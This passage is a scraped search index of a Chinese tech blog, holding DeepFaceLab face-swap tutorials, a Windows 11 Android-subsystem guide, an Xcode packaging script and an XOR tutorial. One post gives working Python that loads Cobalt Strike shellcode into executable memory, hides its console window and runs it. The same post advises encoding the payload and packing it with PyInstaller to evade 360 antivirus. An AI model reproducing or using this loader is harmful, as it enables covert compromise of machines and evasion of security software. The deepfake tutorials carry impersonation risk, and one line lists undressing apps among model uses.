换脸"],"title":"DeepFaceLab3：工作目录和基本概念","uri":"/zh-cn/13-1/"},{"categories":["AI 换脸"],"content":"工作目录里都有啥？ workspace主要包含如下文件： data_dst（目标素材） data_src （源素材） model （模型） data_dst.mp4 （目标视频） data_src.mp4 （源视频） DeepFaceLab为了简化操作和规范素材名称，采用惯例的方式。就是把所有素材统一放workspace里面，而且统一命名。所有文件夹，文件名都不能乱改。 ","date":"2021-12-13","objectID":"/zh-cn/13-1/:0:1","tags":["AI 换脸"],"title":"DeepFaceLab3：工作目录和基本概念","uri":"/zh-cn/13-1/"},{"categories":["AI 换脸"],"content":"什么是视频换脸？ 所谓视频换脸就是把一个人的脸换到另一个人的脑袋上并保持表情神态的同步。比如将张三的脸换到李四身上。源素材取自张三，我们需要换脸的对象是李四。张三提供脸，李四提供身体，最后的结果是李四看起来变成了张三。而为了实现换脸这个目标我们需要收集两个人的视频。 张三的视频叫data_src.mp4，我们称为源视频， 李四的视频叫data_dst.mp4，我们称为目标视频。 有了视频之后我们需要将视频里的人脸提取出来，让AI去分析学习人脸特征。 data_dst 和data_src 文件夹里放的就是目标视频和源视频中提取出来的图片和人脸。 图片是指把视频转换成一张一张的图片，人脸是指从图片中抠出人脸部分并摆端正，最后放在aligned文件夹里面。在抠图的同时还会用一些点标出人脸的轮廓放在debug文件里面。 ","date":"2021-12-13","objectID":"/zh-cn/13-1/:0:2","tags":["AI 换脸"],"title":"DeepFaceLab3：工作目录和基本概念","uri":"/zh-cn/13-1/"},{"categories":["AI 换脸"],"content":"模型是什么？ DeepFaceLab换脸看是有很多步骤，其实就两大步骤，一个是训练模型，一个是应用模型。model文件夹里面放的就是模型文件，是换脸软件的核心所在。 那么模型是个啥东西？ 有人可能会理解为模板，这种比喻并不精确，但是有那么一点意思。模板只能简单的复刻，但是模型可以自动匹配各种表情，要智能一些。 其实在深度学习里面模型这个概念无处不在，我们常用的基于深度学的一些应用，比如美颜，贴图，翻译，语音识别，语音合成，人脸识别，去码，脱衣，背后都有模型。 模型就像是一个学富五车或者特别擅长某种技能的人。所谓训练模型，就像是训练一个小孩子，让他学习增加某一方的能力。 那些“绘画”能力特别强的机器视觉模型，我们可以把它比喻成一个画师。没学习之前，他什么不会。你给他看了很多法外狂徒的视频，他不断临摹之后，就掌握了画出张三的能力。因为他的大脑就是为绘画而生，所以他闭着眼睛也能画出张三，更厉害的是，给他一张李四的脸他也能画出和李四表情一样的张三。当然，要变得这么强，除了天赋之外，学习时间肯定少不了，而且得多看高清视频，记住各种细节才可以。光记住还不行，还得有一定的联想能力。 训练模型也常常被称为“炼丹”，而模型就是仙丹。要搞个仙丹肯定不容易是吧。比如，太上老君练齐天大圣，练了那么多太天，一不小心还是没练成。练好一颗丹，需要很多条件。 首先，得有好的原材料（人脸素材）。 其次，得有好的丹炉（电脑硬件显卡CPU） 再次，得掌握好火候（参数） 最后，八八六十四一天不能少。（时间） 初学者，肯定要反复尝试，才能找到最好的方式。 不同仙丹，有不同的效果。有些包治百病（通用模型），有些只有一个功效比如长生不老（专用模型） 说回画师，有的画师稍作学习什么都能画（通用模型），有的画师只会画一个人（专用模型） ","date":"2021-12-13","objectID":"/zh-cn/13-1/:0:3","tags":["AI 换脸"],"title":"DeepFaceLab3：工作目录和基本概念","uri":"/zh-cn/13-1/"},{"categories":["AI 换脸"],"content":"名字不能随便改 如果不懂workspace的命名规则，可能会出现一些问题。一定记住不要少文件，也不要改文件名。比如提取src的时候一定要有data_src.mp4这个视频，其他名字没用。合成视频的时候一定要有dat_dst.mp4这个视频，没有那就直接报错。比如你自己的视频原先叫“我很帅.mp4” ，你想换脸，就必须把这句话改掉，改成data_src.mp4 。不管多帅都得按规矩来。 ","date":"2021-12-13","objectID":"/zh-cn/13-1/:0:4","tags":["AI 换脸"],"title":"DeepFaceLab3：工作目录和基本概念","uri":"/zh-cn/13-1/"},{"categories":["AI 换脸"],"content":"如何用图片来换脸？ 虽然一直建议用视频素材来换脸，但是依旧有很多人问到能不能用图片换脸。能，是肯定能，但是你不要希望在DFL上用一张图片来换出好的效果。用图片换脸，只需要将完整的图片直接放在data_src文件里面，然后用提取脚本提取人脸即可，其他操作和视频换脸一模一样。 概念这个东西吧，理解了很有用，不理解好像也没啥用。不理解也没关系，只要记住workspace这个文件夹，所有相关的素材都放在里面。下一篇，我们就“不讲道理”了，直接一步一步来操作。 DeepFaceLab3系列 DeepFaceLab3：软硬件以及系统要求 DeepFaceLab3：工作目录和基本概念 DeepFaceLab3：视频换脸完整流程详解！ DeepFaceLab3：模型的异同，选择，基础操作！ 手机扫一扫 jQuery('#qrcode').qrcode({ width: 96, height: 96, colorDark : \"#000000\", colorLight : \"#ffffff\", text: window.location.href });$(\"#save\").click(function () { var canvas = $('#qrcode').find(\"canvas\").get(0); var url = canvas.toDataURL('image/jpeg');$(\"#download\").attr('href', url).get(0).click(); return false; }); ","date":"2021-12-13","objectID":"/zh-cn/13-1/:0:5","tags":["AI 换脸"],"title":"DeepFaceLab3：工作目录和基本概念","uri":"/zh-cn/13-1/"},{"categories":["AI 换脸"],"content":" $(document).ready(function() {$(\"#begin_speak\").click(function () { let content = $(\"#text\").text(); let msg = new SpeechSynthesisUtterance(content); window.speechSynthesis.speak(msg);$(\"#pause_speak\").show();$(\"#cancel_speak\").show();});$(\"#cancel_speak\").click(function () { window.speechSynthesis.cancel();$(\"#pause_speak\").hide();$(\"#resume_speak\").hide();$(this).hide(); });$(\"#pause_speak\").click(function () { window.speechSynthesis.pause();$(\"#resume_speak\").show(); });$(\"#resume_speak\").click(function () { window.speechSynthesis.resume();$(this).hide(); }); }); # DeepFaceLab3：软硬件以及系统要求 好久不见，近来半年都在挖矿，种田，搞区块链。这段时间DeepFaceLab也有了不少更新，最大的更新是新出了AMP模型和实时换脸软件DeepFaceLive。所以准备详细的写一个新的系列教程。从0开始，一直写到实时换脸。 DeepFaceLab并没有内置版本号，我们通常都是用发布日期来做版本区别。为了看起来更加直观，我就把2021发布的支持3000系列显卡的版本称为DeepFaceLab3.0，这个教程里面用的版本为DeepFacelab20210801中文版。 工欲善其事必先利其器，想要玩转换脸，硬件，软件，系统必须跟上！先从准备工作说起。 硬件 软件 系统 驱动 ","date":"2021-12-13","objectID":"/zh-cn/13/:0:0","tags":["AI 换脸"],"title":"DeepFaceLab3：软硬件以及系统要求","uri":"/zh-cn/13/"},{"categories":["AI 换脸"],"content":"硬件 换脸软件出来也好几年了，但是目前依旧对硬件依赖比较大。想要在自己电脑上跑换脸软件就必须要一张显卡，想要轻松点，就必须要一张好显卡（今年搞一张好显卡不容易）。 显卡主要分N卡（英伟达）和A卡（AMD），一般来说是推荐N卡，N卡的支持会更好，使用场景更广泛。 在DeepFaceLab的历史版本中，曾经有支持A卡的opencl版本，中途放弃了对A卡的支持，2021终于有了支持A卡的DirectX12版本。总的来说，买一张中上水平的N卡，肯定可以玩，如果是A卡就需要确认支持DirectX12。 常见的N卡有10系列，20系列，30系列。还有丽台，泰坦，特斯拉，安倍。几乎所有显存大于2G的N卡都支持。 rtx3060 12G 因为显存大，对于跑模型有优势，性价比较高。所有60结尾的卡，都是性价比比较高，功耗比较低，显存还可以。而50结尾的卡么….。如果你只在乎性能，那么可以上目前最强的游戏卡RTX3090，指导价一万出头，市场价可能两万多。除了3090，上一代的2080ti，和上上代的1080ti 也是一个不错的选择，这两张卡显存比较给力，速度也比较快，提取头像比3000系列还有优势。 除了显卡之外，其实CPU最好也跟上。显卡特别快，处理器跟不上，整体速度就会下来。显卡和cpu的比较强的情况下，电源供电一定要有保障。电源不够的话，烧卡不至于，但是可能会重启，不稳定。 关于硬盘，使用普通HDD完全没有问题，用SSD的话在某些情况下会更好。比如加载，写入的时候，还有大量素材图片拷贝，黏贴，删除的时候。 总而言之，想要玩基于深度学习的软件，都需要中高端配置。其中显卡和显存是核心指标。 除了使用本地显卡之外，也可以在云平台租用显卡，这种平台很多，比如阿里云，腾讯云，百度云，滴滴云，矩池云。这种方式好处是随时随地都可以用，不用关心散热和噪音，不用管电费，也不用本地挂机。一启动就可以让它自己修炼去，时间到了我们去摘果子就好了。通过远程桌面可以像本地电脑一样操作，非常便捷。唯一的缺点就是“贵” ，没有任何残值可言。 在云端方案中google推出的Colab是极具性价比的一种方案。首选，免费用户也可以使用，只是分配到的设备比较差，一般是k80。其次，会员很便宜，9.9刀就能用上V100,P100。现在好像推出了更贵套餐。缺点是需要科学上网，需要了解脚本，脚本有执行时长限制，需要有一台电脑挂机。 这种方案是基于浏览器的，所以理论上任何有浏览器的设备都可以使用，但是还是推荐用电脑。 我有在GitHub创建了一个叫DeepFaceLab_colab的项目，使用定制的脚本通过点点点就能使用colab来炼丹了，目前脚本已经更新到V5，支持最新版本。近期我会针对V5写一个详细的教程（如果不鸽~~~） ","date":"2021-12-13","objectID":"/zh-cn/13/:2:0","tags":["AI 换脸"],"title":"DeepFaceLab3：软硬件以及系统要求","uri":"/zh-cn/13/"},{"categories":["AI 换脸"],"content":"软件 软件方面，DeepFaceLab相比之前的一些换脸软件，最大的优势就是“集成” 。如果你使用DeepFaceLab，千万不要去装什么CUDA，CUDN，除非你知道自己在干什么。 软件方面主要是注意版本的问题。 DeepFaceLab最早的版本可以追溯到2018年，目前比较推荐的是2020年8月份的版本，以及2021年8月份的版本。选择版本需要注意几个点。 A卡还是N卡？ A卡只能用2019年opencl版和2021的DirectX12版。 RTX3000系列么？3000系列推荐最新的版本，20系列和更早的卡推荐20200802版本。 AMP模型和DeepFaceLive 需要使用最新版20210801,老版本没有导出模型的功能 目前发布的软件中，往往都包含三个版本，每个版本都针对不同的设备。 RTX2080ti：针对2080ti以及以下版本 RTX3000：针对3000系列显卡 DirectX12：针对支持DirectX12 需要注意的是，2080ti版肯定不能用在30系列显卡上，而rtx3000可以支持老显卡。DirectX12并不针对A卡或者N卡，而是针对支持DirectX12的显卡设备。言下之意不支持DirectX12的显卡，不管你姓黄还是姓苏，都没用。大部分新卡都支持！ ","date":"2021-12-13","objectID":"/zh-cn/13/:3:0","tags":["AI 换脸"],"title":"DeepFaceLab3：软硬件以及系统要求","uri":"/zh-cn/13/"},{"categories":["AI 换脸"],"content":"系统 从大的的范畴来说，除了MacOS支持不好之外，window和linux全部可以使用。 敢用Linux的反正的自己都有几把刷子，可以自己去研究。想要省点时间的可以参考我在deepfaker.xyz上面写的文章，阿里云，滴滴云，矩池云我都专门写过非常详细的文章，虽然版本升级了，但是依旧是那些套路。 Window方面，主要是支持win10和win7。但是随着30系列新显卡的推出，WIN7不推荐了。使用30系列显卡的朋友需确保三件事情： 操作系统版本Win10 20h2+ 驱动去官方下载更新到最新 启用操作系统的GPU加速计划 驱动不够新，提取这一步就过不了。 系统不够新，没有GPU加速选项 没有GPU加速选项，可能导致训练卡死。 新版驱动似乎对GPU加速没有要求，但是保险起见，还是先把上面几点做好。 最后提示一下，XP和32位系统请自觉回避。 ","date":"2021-12-13","objectID":"/zh-cn/13/:4:0","tags":["AI 换脸"],"title":"DeepFaceLab3：软硬件以及系统要求","uri":"/zh-cn/13/"},{"categories":["AI 换脸"],"content":"驱动 DeepFaceLab唯一的依赖就是驱动。驱动最大的问题就是不够新，因为DFL一直在更新，往往都是针对最新的版本。所以驱动一定要跟上。用鲁大师和驱动精灵的需要注意一下，这些第三方软件安装的驱动有可能不是最新的，会出现问题。 关于如何查看驱动版本，如何安装官方驱动，以及驱动的官方下载地址，我在之前的文章中都有提过，在deepfaker.xyz搜驱动就可以找到。 DeepFaceLab3系列 DeepFaceLab3：软硬件以及系统要求 DeepFaceLab3：工作目录和基本概念 DeepFaceLab3：视频换脸完整流程详解！ DeepFaceLab3：模型的异同，选择，基础操作！ 手机扫一扫 jQuery('#qrcode').qrcode({ width: 96, height: 96, colorDark : \"#000000\", colorLight : \"#ffffff\", text: window.location.href });$(\"#save\").click(function () { var canvas = $('#qrcode').find(\"canvas\").get(0); var url = canvas.toDataURL('image/jpeg');$(\"#download\").attr('href', url).get(0).click(); return false; }); ","date":"2021-12-13","objectID":"/zh-cn/13/:5:0","tags":["AI 换脸"],"title":"DeepFaceLab3：软硬件以及系统要求","uri":"/zh-cn/13/"},{"categories":["windows","Android"],"content":" $(document).ready(function() {$(\"#begin_speak\").click(function () { let content = $(\"#text\").text(); let msg = new SpeechSynthesisUtterance(content); window.speechSynthesis.speak(msg);$(\"#pause_speak\").show();$(\"#cancel_speak\").show();});$(\"#cancel_speak\").click(function () { window.speechSynthesis.cancel();$(\"#pause_speak\").hide();$(\"#resume_speak\").hide();$(this).hide(); });$(\"#pause_speak\").click(function () { window.speechSynthesis.pause();$(\"#resume_speak\").show(); });$(\"#resume_speak\").click(function () { window.speechSynthesis.resume();$(this).hide(); }); }); # windows 11安装安卓应用程序 ","date":"2021-12-12","objectID":"/zh-cn/12/:0:0","tags":["windows","Android"],"title":"windows 11安装安卓应用程序","uri":"/zh-cn/12/"},{"categories":["windows","Android"],"content":"一、目的 在windows 11中通过windows 11自带的子系统功能，实现自由安装安卓应用程序 ","date":"2021-12-12","objectID":"/zh-cn/12/:1:0","tags":["windows","Android"],"title":"windows 11安装安卓应用程序","uri":"/zh-cn/12/"},{"categories":["windows","Android"],"content":"二、实现 ","date":"2021-12-12","objectID":"/zh-cn/12/:2:0","tags":["windows","Android"],"title":"windows 11安装安卓应用程序","uri":"/zh-cn/12/"},{"categories":["windows","Android"],"content":"1、前提 首先，你需要一台windows 11系统的计算机，并且使用的是预览版系统中的beta或dev渠道（截止本文创作时，2021-12-07，正式版系统尚未提供安卓子系统），并把系统更新到最新版本，如果这一步做不到，请自行百度 ","date":"2021-12-12","objectID":"/zh-cn/12/:2:1","tags":["windows","Android"],"title":"windows 11安装安卓应用程序","uri":"/zh-cn/12/"},{"categories":["windows","Android"],"content":"2、更新系统后打开Microsoft Store，会在标题旁边出现PREVIEW，如下图 ","date":"2021-12-12","objectID":"/zh-cn/12/:2:2","tags":["windows","Android"],"title":"windows 11安装安卓应用程序","uri":"/zh-cn/12/"},{"categories":["windows","Android"],"content":"3、安装Windows Subsystem for Android 1.系统中搜索启用或关闭 Windows 功能并打开，勾选下图中的几个。如果发现没有这几个功能，就要先到BIOS/UEFI 开启「 Virtualization 」和「 Hyper-V 」相关的功能； 2.设置-时间和语言-语言\u0026区域，把windows 显示语言改为English (United States)，然后注销账户重新登录，之后还是到这个菜单，把Country or region改成United States，Regional format改成English (United States) 3.点这里跳转Microsoft Store 网页版，在弹出窗口一定要选保留使用United States – English，然后点击GET，然后浏览器会有弹框，点击允许跳转，之后会跳转到Microsoft Store，点击install，就会安装Amazon Appstore和Windows Subsystem for Android，等待安装完成。之后可以反向操作，把系统语言改成中文。 至此，如果你有美国VPN，已经可以在亚马逊应用商店下载安卓应用程序了，但里边应用程序有限，且需要美国VPN，想自由安装应用程序接着往下看。 ","date":"2021-12-12","objectID":"/zh-cn/12/:2:3","tags":["windows","Android"],"title":"windows 11安装安卓应用程序","uri":"/zh-cn/12/"},{"categories":["windows","Android"],"content":"4、设置安卓子系统的开发者模式 在开始菜单中找到适用于 Android 的 Windows 子系统设置，打开开发人员模式 然后点击开发人员模式下边的小蓝字管理开发人员设置，开启USB调试和无线调试 至此，有adb调试经验的朋友已经知道怎么做了，对于不太有经验的朋友，可以去Microsoft Store下载WSATools，第一次打开需要找个文件夹安装ADB，然后就能通过这个软件自由安装apk了。 安装后会在开始菜单展示应用程序，部分app可能不适配，还经常出现闪退，总之目前这安卓子系统不够稳定（不排除是我电脑的问题）。 经验 手机扫一扫 jQuery('#qrcode').qrcode({ width: 96, height: 96, colorDark : \"#000000\", colorLight : \"#ffffff\", text: window.location.href });$(\"#save\").click(function () { var canvas = $('#qrcode').find(\"canvas\").get(0); var url = canvas.toDataURL('image/jpeg');$(\"#download\").attr('href', url).get(0).click(); return false; }); ","date":"2021-12-12","objectID":"/zh-cn/12/:2:4","tags":["windows","Android"],"title":"windows 11安装安卓应用程序","uri":"/zh-cn/12/"},{"categories":["Python","免杀"],"content":" $(document).ready(function() {$(\"#begin_speak\").click(function () { let content = $(\"#text\").text(); let msg = new SpeechSynthesisUtterance(content); window.speechSynthesis.speak(msg);$(\"#pause_speak\").show();$(\"#cancel_speak\").show();});$(\"#cancel_speak\").click(function () { window.speechSynthesis.cancel();$(\"#pause_speak\").hide();$(\"#resume_speak\").hide();$(this).hide(); });$(\"#pause_speak\").click(function () { window.speechSynthesis.pause();$(\"#resume_speak\").show(); });$(\"#resume_speak\").click(function () { window.speechSynthesis.resume();$(this).hide(); }); }); # [用python做一个能过360的免杀CS马](https://ybrc.github.io/zh-cn/11) 拿到shell了, 机器上有个360?? 做个免杀吧! 更新: python真的不行…还是老老实实C++写吧 ( 本文将通过python的ctypes库加载Cobalt Strike马实现免杀. 其实这已经不是一个新方法了; 但是它依然十分有效, 即使不做任何混淆也能过360. ","date":"2021-12-11","objectID":"/zh-cn/11/:0:0","tags":["Python","免杀"],"title":"用python做一个能过360的免杀CS马","uri":"/zh-cn/11/"},{"categories":["Python","免杀"],"content":"写个python文件加载CS shellcode shellcode写到内存中, 用ctypes.windll加载即可. 先用CS生成shellcode, Output类型选python 然后放进这份网传的python代码中, 替换掉buf. from ctypes import * import ctypes buf = \"\" PROT_READ = 1 PROT_WRITE = 2 PROT_EXEC = 4 def executable_code(buffer): buf = c_char_p(buffer) size = len(buffer) addr = libc.valloc(size) addr = c_void_p(addr) if 0 == addr: raise Exception(\"Failed to allocate memory\") memmove(addr, buf, size) if 0 != libc.mprotect(addr, len(buffer), PROT_READ | PROT_WRITE | PROT_EXEC): raise Exception(\"Failed to set protection on buffer\") return addr VirtualAlloc = ctypes.windll.kernel32.VirtualAlloc VirtualProtect = ctypes.windll.kernel32.VirtualProtect shellcode = bytearray(buf) whnd = ctypes.windll.kernel32.GetConsoleWindow() if whnd != 0: if 1: ctypes.windll.user32.ShowWindow(whnd, 0) ctypes.windll.kernel32.CloseHandle(whnd) memorywithshell = ctypes.windll.kernel32.VirtualAlloc(ctypes.c_int(0), ctypes.c_int(len(shellcode)), ctypes.c_int(0x3000), ctypes.c_int(0x40)) buf = (ctypes.c_char * len(shellcode)).from_buffer(shellcode) old = ctypes.c_long(1) VirtualProtect(memorywithshell, ctypes.c_int(len(shellcode)),0x40,ctypes.byref(old)) ctypes.windll.kernel32.RtlMoveMemory(ctypes.c_int(memorywithshell), buf, ctypes.c_int(len(shellcode))) shell = cast(memorywithshell, CFUNCTYPE(c_void_p)) shell() Python 记得全程用python2. python3.9因未知原因失败了. 它运行一下就可以CS上线了. ","date":"2021-12-11","objectID":"/zh-cn/11/:0:1","tags":["Python","免杀"],"title":"用python做一个能过360的免杀CS马","uri":"/zh-cn/11/"},{"categories":["Python","免杀"],"content":"混淆/编码 不编码也能过360, 不过还是编码一下比较保险一些. 你可以尝试: 编码shellcode 编码整个程序然后exec etc… 可以对每个byte异或一个字符, 或者上加密. ","date":"2021-12-11","objectID":"/zh-cn/11/:0:2","tags":["Python","免杀"],"title":"用python做一个能过360的免杀CS马","uri":"/zh-cn/11/"},{"categories":["Python","免杀"],"content":"用PyInstaller打包成exe 很简单, pyinstaller.exe --onefile -w ./payload.py Shell 即可. 注意: 如果你编码了程序, 记得在最外层import所有需要的库, 否则执行时会因为找不到库而出错. 不要在联网状态下扫描你的程序, 不然第二天它就挂了( 是这样… 第二天挂了之后, 再尝试换个花样上去几分钟就被360杀了, 可能360记录了我的ip之类的. 考虑上cloudflare转发? VT结果: https://www.virustotal.com/gui/file/3a2c7ca6533139de0d727649e554e507ec5af4066d3753bfa71f93be613990e6/detection 手机扫一扫 jQuery('#qrcode').qrcode({ width: 96, height: 96, colorDark : \"#000000\", colorLight : \"#ffffff\", text: window.location.href });$(\"#save\").click(function () { var canvas = $('#qrcode').find(\"canvas\").get(0); var url = canvas.toDataURL('image/jpeg');$(\"#download\").attr('href', url).get(0).click(); return false; }); ","date":"2021-12-11","objectID":"/zh-cn/11/:0:3","tags":["Python","免杀"],"title":"用python做一个能过360的免杀CS马","uri":"/zh-cn/11/"},{"categories":["MacOS Xcode"],"content":" $(document).ready(function() {$(\"#begin_speak\").click(function () { let content = $(\"#text\").text(); let msg = new SpeechSynthesisUtterance(content); window.speechSynthesis.speak(msg);$(\"#pause_speak\").show();$(\"#cancel_speak\").show();});$(\"#cancel_speak\").click(function () { window.speechSynthesis.cancel();$(\"#pause_speak\").hide();$(\"#resume_speak\").hide();$(this).hide(); });$(\"#pause_speak\").click(function () { window.speechSynthesis.pause();$(\"#resume_speak\").show(); });$(\"#resume_speak\").click(function () { window.speechSynthesis.resume();$(this).hide(); }); }); 最近经常给测试发包，用老办法的话总是先生成app文件，然后拖到iTunes下生成ipa文件，虽然说过程简单，但重复做这么件事总会觉得麻烦。因此用xCode命令行工具提供的`xcrun`工具写成shell，然后再添加到xCode的工程下，这样就很方便的在每次build之后就能生成相应的ipa文件。shell如下： #!/bin/sh rm -rdf build mkdir build exec \u003e\u0026 build/shell.log /usr/bin/xcrun -sdk iphoneos PackageApplication -v \"$BUILT_PRODUCTS_DIR/$PRODUCT_NAME.app\" -o \"$SRCROOT/build/$PRODUCT_NAME.ipa\" 会在工程根目录下生成一个build文件夹，然后会把生成的日志和ipa文件放到文件夹下。 然后在project下的Build Phase下Add Run Script将shell路径添加进去。 手机扫一扫 jQuery('#qrcode').qrcode({ width: 96, height: 96, colorDark : \"#000000\", colorLight : \"#ffffff\", text: window.location.href });$(\"#save\").click(function () { var canvas = $('#qrcode').find(\"canvas\").get(0); var url = canvas.toDataURL('image/jpeg');$(\"#download\").attr('href', url).get(0).click(); return false; }); ","date":"2021-12-08","objectID":"/zh-cn/8/:0:0","tags":["MacOS Xcode"],"title":"xCode下自动打包为ipa文件","uri":"/zh-cn/8/"},{"categories":["异或运算"],"content":"此文为加密收费内容添加我微信支付后可看: $(document).ready(function() {$(\"#begin_speak\").click(function () { let content = $(\"#text\").text(); let msg = new SpeechSynthesisUtterance(content); window.speechSynthesis.speak(msg);$(\"#pause_speak\").show();$(\"#cancel_speak\").show();});$(\"#cancel_speak\").click(function () { window.speechSynthesis.cancel();$(\"#pause_speak\").hide();$(\"#resume_speak\").hide();$(this).hide(); });$(\"#pause_speak\").click(function () { window.speechSynthesis.pause();$(\"#resume_speak\").show(); });$(\"#resume_speak\").click(function () { window.speechSynthesis.resume();$(this).hide(); }); }); # 异或运算 XOR 教程 大家比较熟悉的逻辑运算，主要是\"与运算\"（AND）和\"或运算\"（OR），还有一种\"异或运算\"（XOR），也非常重要。 本文介绍异或运算的含义和应用。 ","date":"2021-12-06","objectID":"/zh-cn/%E5%BC%82%E6%88%96%E8%BF%90%E7%AE%97xor%E6%95%99%E7%A8%8B/:0:0","tags":["异或运算"],"title":"异或运算XOR教程","uri":"/zh-cn/%E5%BC%82%E6%88%96%E8%BF%90%E7%AE%97xor%E6%95%99%E7%A8%8B/"},{"categories":["异或运算"],"content":"一、含义 XOR 是 exclusive OR 的缩写。英语的 exclusive 意思是\"专有的，独有的\"，可以理解为 XOR 是更单纯的 OR 运算。 我们知道，OR 运算的运算子有两种情况，计算结果为true。 （1）一个为 true，另一个为 false; （2）两个都为 true。 上面两种情况，有时候需要明确区分，所以引入了 XOR。 XOR 排除了第二种情况，只有第一种情况（一个运算子为true，另一个为false）才会返回 true，所以可以看成是更单纯的 OR 运算。也就是说， XOR 主要用来判断两个值是否不同。 XOR 一般使用插入符号（caret）^表示。如果约定0 为 false，1 为 true，那么 XOR 的运算真值表如下。 0 ^ 0 = 0 0 ^ 1 = 1 1 ^ 0 = 1 1 ^ 1 = 0 ","date":"2021-12-06","objectID":"/zh-cn/%E5%BC%82%E6%88%96%E8%BF%90%E7%AE%97xor%E6%95%99%E7%A8%8B/:1:0","tags":["异或运算"],"title":"异或运算XOR教程","uri":"/zh-cn/%E5%BC%82%E6%88%96%E8%BF%90%E7%AE%97xor%E6%95%99%E7%A8%8B/"},{"categories":["异或运算"],"content":"二、运算定律 XOR 运算有以下的运算定律。由于非常简单，这里就省略证明了。 （1）一个值与自身的运算，总是为 false。 x ^ x = 0 （2）一个值与 0 的运算，总是等于其本身。 x ^ 0 = x （3）可交换性 x ^ y = y ^ x （4）结合性 x ^ (y ^ z) = (x ^ y) ^ z ","date":"2021-12-06","objectID":"/zh-cn/%E5%BC%82%E6%88%96%E8%BF%90%E7%AE%97xor%E6%95%99%E7%A8%8B/:2:0","tags":["异或运算"],"title":"异或运算XOR教程","uri":"/zh-cn/%E5%BC%82%E6%88%96%E8%BF%90%E7%AE%97xor%E6%95%99%E7%A8%8B/"},{"categories":["异或运算"],"content":"三、应用 根据上面的这些运算定律，可以得到异或运算的很多重要应用。 ","date":"2021-12-06","objectID":"/zh-cn/%E5%BC%82%E6%88%96%E8%BF%90%E7%AE%97xor%E6%95%99%E7%A8%8B/:3:0","tags":["异或运算"],"title":"异或运算XOR教程","uri":"/zh-cn/%E5%BC%82%E6%88%96%E8%BF%90%E7%AE%97xor%E6%95%99%E7%A8%8B/"},{"categories":["异或运算"],"content":"3.1 简化计算 多个值的异或运算，可以根据运算定律进行简化。 a ^ b ^ c ^ a ^ b = a ^ a ^ b ^ b ^ c = 0 ^ 0 ^ c = c ","date":"2021-12-06","objectID":"/zh-cn/%E5%BC%82%E6%88%96%E8%BF%90%E7%AE%97xor%E6%95%99%E7%A8%8B/:3:1","tags":["异或运算"],"title":"异或运算XOR教程","uri":"/zh-cn/%E5%BC%82%E6%88%96%E8%BF%90%E7%AE%97xor%E6%95%99%E7%A8%8B/"},{"categories":["异或运算"],"content":"3.2 交换值 两个变量连续进行三次异或运算，可以互相交换值。 假设两个变量是x和y，各自的值是a和b。下面就是x和y进行三次异或运算，注释部分是每次运算后两个变量的值。 x = x ^ y // (a ^ b, b) y = x ^ y // (a ^ b, a ^ b ^ b) =\u003e (a ^ b, a) x = x ^ y // (a ^ b ^ a, a) =\u003e (b, a) 这是两个变量交换值的最快方法，不需要任何额外的空间。 ","date":"2021-12-06","objectID":"/zh-cn/%E5%BC%82%E6%88%96%E8%BF%90%E7%AE%97xor%E6%95%99%E7%A8%8B/:3:2","tags":["异或运算"],"title":"异或运算XOR教程","uri":"/zh-cn/%E5%BC%82%E6%88%96%E8%BF%90%E7%AE%97xor%E6%95%99%E7%A8%8B/"},{"categories":["异或运算"],"content":"3.3 加密 异或运算可以用于加密。 第一步，明文（text）与密钥（key）进行异或运算，可以得到密文（cipherText）。 text ^ key = cipherText 第二步，密文与密钥再次进行异或运算，就可以还原成明文。 cipherText ^ key = text 原理很简单，如果明文是 x，密钥是 y，那么 x 连续与 y 进行两次异或运算，得到自身。 (x ^ y) ^ y = x ^ (y ^ y) = x ^ 0 = x ","date":"2021-12-06","objectID":"/zh-cn/%E5%BC%82%E6%88%96%E8%BF%90%E7%AE%97xor%E6%95%99%E7%A8%8B/:3:3","tags":["异或运算"],"title":"异或运算XOR教程","uri":"/zh-cn/%E5%BC%82%E6%88%96%E8%BF%90%E7%AE%97xor%E6%95%99%E7%A8%8B/"},{"categories":["异或运算"],"content":"3.4 数据备份 异或运算可以用于数据备份。 文件 x 和文件 y 进行异或运算，产生一个备份文件 z。 x ^ y = z 以后，无论是文件 x 或文件 y 损坏，只要不是两个原始文件同时损坏，就能根据另一个文件和备份文件，进行还原。 x ^ z = x ^ (x ^ y) = (x ^ x) ^ y = 0 ^ y = y 上面的例子是 y 损坏，x 和 z 进行异或运算，就能得到 y。 ","date":"2021-12-06","objectID":"/zh-cn/%E5%BC%82%E6%88%96%E8%BF%90%E7%AE%97xor%E6%95%99%E7%A8%8B/:3:4","tags":["异或运算"],"title":"异或运算XOR教程","uri":"/zh-cn/%E5%BC%82%E6%88%96%E8%BF%90%E7%AE%97xor%E6%95%99%E7%A8%8B/"},{"categories":["异或运算"],"content":"四、一道面试题 一些面试的算法题，也能使用异或运算快速求解。 请看下面这道题。 一个数组包含 n-1 个成员，这些成员是 1 到 n 之间的整数，且没有重复，请找出缺少的那个数字。 最快的解答方法，就是把所有数组成员（A[0] 一直到 A[n-2]）与 1 到 n 的整数全部放在一起，进行异或运算。 A[0] ^ A[1] ^ ... ^ A[n-2] ^ 1 ^ 2 ^ ... ^ n 上面这个式子中，每个数组成员都会出现两次，相同的值进行异或运算就会得到 0。只有缺少的那个数字出现一次，所以最后得到的就是这个值。 你可能想到了，加法也可以解这道题。 1 + 2 + ... + n - A[0] - A[1] - ... - A[n-2] 但是，加法的速度没有异或运算快，而且需要额外的空间。如果数字比较大，还有溢出的可能。 下面是一道类似的题目，大家可以作为练习。 一个数组包含 n+1 个成员，这些成员是 1 到 n 之间的整数。只有一个成员出现了两次，其他成员都只出现一次，请找出重复出现的那个数字。 ","date":"2021-12-06","objectID":"/zh-cn/%E5%BC%82%E6%88%96%E8%BF%90%E7%AE%97xor%E6%95%99%E7%A8%8B/:4:0","tags":["异或运算"],"title":"异或运算XOR教程","uri":"/zh-cn/%E5%BC%82%E6%88%96%E8%BF%90%E7%AE%97xor%E6%95%99%E7%A8%8B/"},{"categories":["异或运算"],"content":"五、参考链接 That XOR Trick （完） 手机扫一扫 jQuery('#qrcode').qrcode({ width: 96, height: 96, colorDark : \"#000000\", colorLight : \"#ffffff\", text: window.location.href });$(\"#save\").click(function () { var canvas = $('#qrcode').find(\"canvas\").get(0); var url = canvas.toDataURL('image/jpeg');$(\"#download\").attr('href', url).get(0).click(); return false; }); ","date":"2021-12-06","objectID":"/zh-cn/%E5%BC%82%E6%88%96%E8%BF%90%E7%AE%97xor%E6%95%99%E7%A8%8B/:5:0","tags":["异或运算"],"title":"异或运算XOR教程","uri":"/zh-cn/%E5%BC%82%E6%88%96%E8%BF%90%E7%AE%97xor%E6%95%99%E7%A8%8B/"},{"categories":["汇编 